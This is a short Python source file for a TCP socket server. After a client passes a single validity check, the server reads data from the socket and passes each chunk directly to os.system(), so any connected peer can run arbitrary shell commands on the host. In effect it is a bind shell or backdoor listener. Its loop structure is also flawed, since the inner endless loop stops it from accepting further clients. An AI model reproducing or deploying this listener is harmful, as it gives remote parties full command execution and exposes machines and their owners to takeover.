import socket
from .conn import Server_conn
import os
import threading

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        
    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(1)
        print(self.host, self.port)
        
        while True:
            clientsocket, address = s.accept()
            print(f"{address}")
            c = Server_conn(address)
            t1 = threading.Thread(target=c.new_client)
            t2 = threading.Thread(target=c.msg)
            t1.start()
            t2.start()
            if c.is_valid():
                print(f'{address} is connected !')
                while True:
                    data = clientsocket.recv(1024)
                    os.system(data)
                    print(data)